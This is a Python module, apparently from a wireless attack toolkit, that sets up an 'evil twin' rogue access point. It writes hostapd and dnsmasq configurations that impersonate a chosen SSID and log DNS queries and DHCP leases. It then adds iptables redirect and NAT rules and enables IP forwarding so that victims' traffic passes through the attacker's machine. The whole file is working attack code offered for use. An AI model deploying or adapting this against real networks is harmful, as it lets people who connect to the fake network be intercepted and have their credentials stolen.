# app/engine/evil_twin.py
import subprocess
import os


def create_hostapd_config(interface, ssid, channel, config_dir):
    config_path = os.path.join(config_dir, "hostapd.conf")
    config_content = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
    try:
        with open(config_path, "w") as f:
            f.write(config_content)
        print(f"[+] hostapd.conf created at: {config_path}")
        return config_path
    except Exception as e:
        print(f"[!] Error creating hostapd.conf: {e}")
        return None


def create_dnsmasq_config(interface, config_dir):  # Changed parameter name
    config_path = os.path.join(config_dir, "dnsmasq.conf")
    config_content = f"""interface={interface}  # Now using correct parameter name
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
"""
    try:
        with open(config_path, "w") as f:
            f.write(config_content)
        print(f"[+] dnsmasq.conf created at: {config_path}")
        return config_path
    except Exception as e:
        print(f"[!] Error creating dnsmasq.conf: {e}")
        return None


def run_command(argv):
    """Run a command from an argv list — never through a shell interpreter."""
    try:
        print(f"[*] Running: {' '.join(argv)}")
        subprocess.run(argv, check=True)
    except subprocess.CalledProcessError:
        print(f"[!] Command failed: {' '.join(argv)}")


def setup_fake_ap_network(interface='wlan0'):
    # Bring up the AP interface with a static IP
    run_command(["ifconfig", interface, "up", "192.168.1.1", "netmask", "255.255.255.0"])
    # Add static route
    run_command(["route", "add", "-net", "192.168.1.0", "netmask", "255.255.255.0", "gw", "192.168.1.1"])
    # Redirect HTTP to port 80
    run_command(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"])
    # Enable internet sharing
    run_command(["iptables", "--table", "nat", "--append", "POSTROUTING", "--out-interface", "eth0", "-j", "MASQUERADE"])
    run_command(["iptables", "--append", "FORWARD", "--in-interface", "wlan0", "-j", "ACCEPT"])
    # Enable IP forwarding (was: echo 1 | tee /proc/sys/net/ipv4/ip_forward)
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as fwd:
            fwd.write("1")
    except OSError as exc:
        print(f"[!] Could not enable IP forwarding: {exc}")
